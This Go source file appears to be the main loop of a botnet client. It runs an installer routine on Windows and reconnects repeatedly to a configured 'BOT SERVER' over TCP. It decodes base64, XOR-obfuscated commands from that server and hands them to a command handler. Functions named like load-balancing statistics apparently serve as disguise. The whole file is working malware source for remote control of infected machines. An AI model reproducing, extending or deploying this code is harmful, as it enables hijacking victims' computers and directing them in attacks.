package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"homo/client/balancer"
	"homo/client/installer"
	"net"
	"runtime"
)

// config
const (
	TARGET_SERVER = "127.0.0.1" // BOT SERVER
	TARGET_PORT   = "9999"      // BOT PORT
)

type BalancerStats struct {
	Latency string
	Cpu     int
	Memory  int
}

func main() {
	if runtime.GOOS == "windows" {
		installer.InstallerWin()
	}
CONNECT:
	connection, err := net.Dial("tcp", TARGET_SERVER+":"+TARGET_PORT)

	if err != nil {
		fmt.Println(err)
		goto CONNECT
	}

	lat, cpu, mem, err := balancer.GetStats()

	if err != nil {
		fmt.Println(err)
	}

	b := NewStats(lat, cpu, mem)

	for {

		command := make([]byte, 6000)

		_, err := connection.Read(command)
		if err != nil {
			goto CONNECT
		}

		if bytes.HasPrefix(command, []byte{112, 105, 110, 103}) { // ping message
			continue
		}

		if bytes.HasPrefix(command, []byte{0, 0, 0, 0, 0, 0, 0}) { // nil message
			continue
		}

		var cmd string
		_command, _ := base64.RawStdEncoding.DecodeString(string(command))

		for _, i := range _command {
			cmd += string(i ^ 29>>3)
		}

		CommandHandler(cmd)
		balancer.Balancer(b.Cpu, b.Latency, b.Memory)
	}
}

func NewStats(latency string, cpu, memory int) *BalancerStats {

	return &BalancerStats{
		Latency: latency,
		Cpu:     cpu,
		Memory:  memory,
	}
}
